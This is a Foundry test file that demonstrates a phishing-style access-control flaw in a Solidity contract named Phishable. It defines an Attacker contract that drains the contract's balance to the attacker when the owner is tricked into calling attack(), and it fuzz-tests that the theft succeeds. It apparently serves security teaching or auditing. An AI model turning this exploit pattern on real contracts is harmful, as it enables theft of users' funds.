
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract Attacker {
    Phishable public phishable;
    address payable public beneficiary;

    constructor(Phishable _phishable, address payable _beneficiary) {
        phishable = _phishable;
        beneficiary = _beneficiary;
    }

    function attack() public {
        phishable.withdrawAll(beneficiary);
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public phishable;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        phishable = new Phishable(owner);
    }

    function test_highlightArbitraryUserCanAccess(address caller, uint256 amount) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != owner);
        vm.assume(amount > 0);

        vm.deal(address(phishable), amount);

        vm.startPrank(caller);
        Attacker malicious = new Attacker(phishable, payable(caller));
        vm.stopPrank();

        vm.prank(owner);
        malicious.attack();

        assertEq(address(phishable).balance, 0);
        assertEq(caller.balance, amount);
    }
}
